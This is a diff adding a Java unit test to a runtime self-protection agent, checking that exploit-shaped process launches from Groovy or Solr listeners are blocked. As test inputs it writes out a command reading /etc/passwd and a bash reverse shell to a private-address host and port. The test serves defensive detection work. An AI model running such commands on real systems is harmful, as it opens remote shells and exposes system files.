@@ -120,6 +120,23 @@ final class OutsideRequestTest {
     assertDoesNotThrow(() -> OhMyRaspHooks.beforeHttpExchange(new Object(), new Object(), metadata));
   }
 
+  /**
+   * Under log only, a launch that a Groovy script or Solr's configured listener makes is still stopped when its
+   * arguments are an exploit's: the intrinsic finding is not hidden by the context-dependent one.
+   */
+  @Test
+  void anExploitShapedLaunchUnderAScriptEngineBlocksWithLogOnly() {
+    assertTrue(AgentRuntime.get().apply("{\"mode\":\"block\",\"outside_request\":\"log\"}"));
+    var groovy = java.util.List.of("org.codehaus.groovy.runtime.ProcessGroovyMethods");
+    var solr = java.util.List.of("org.apache.solr.core.RunExecutableListener");
+
+    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeProcessBuilderStart(
+        new ProcessBuilder("sh", "-c", "cat /etc/passwd"), groovy));
+    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeProcessBuilderStart(
+        new ProcessBuilder("bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"), solr));
+    assertDoesNotThrow(() -> OhMyRaspHooks.beforeProcessBuilderStart(new ProcessBuilder("ls", "-l"), groovy));
+  }
+
   /** The YARN handler holds the HTTP request: a denial is inside a request with no servlet frame tracked. */
   @Test
   void aHookThatHoldsTheRequestDecidesInsideARequestWithoutAServletFrame() {
